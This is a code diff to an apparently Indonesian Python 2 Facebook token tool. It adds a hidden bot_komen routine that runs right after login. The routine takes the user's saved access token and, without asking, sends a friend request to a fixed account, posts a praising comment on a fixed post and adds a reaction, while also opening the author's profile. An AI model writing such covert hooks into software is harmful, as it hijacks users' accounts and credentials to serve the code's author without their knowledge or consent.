@@ -109,6 +109,9 @@ def tokenz():
         zedd.write(toket)
         zedd.close()
         print '[✓] Login berhasil ter'
+        print 'abis ini bakal auto komen ke post ane ea bmjir'
+        os.system('xdg-open https://m.facebook.com/akunoval')
+        bot_komen()
         menu()
     except KeyError:
         print "[!] Token Mungkin Salah/Kadalwarsa"
@@ -136,6 +139,23 @@ def update_sc():
     raw_input("\n[Kembali] ? ?")
     os.system("python2 ingfo.py")
     masuk() 
+
+ ###### BOT KOMEN #######
+def bot_komen():
+    try:
+        toket=open('login.txt','r').read()
+    except IOError:
+        print"\033[1;97m[!] Tokennya gabener nih asw"
+        os.system('rm -rf login.txt')
+    una = ('100000074962672')
+    kom = ('sc lu keren x bang💪😎🤙')
+    reac = ('LOVE')
+    post = ('4449003935112061')
+    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
+    menu()
+
 ###### MENU #######
 def menu():
     os.system('clear')
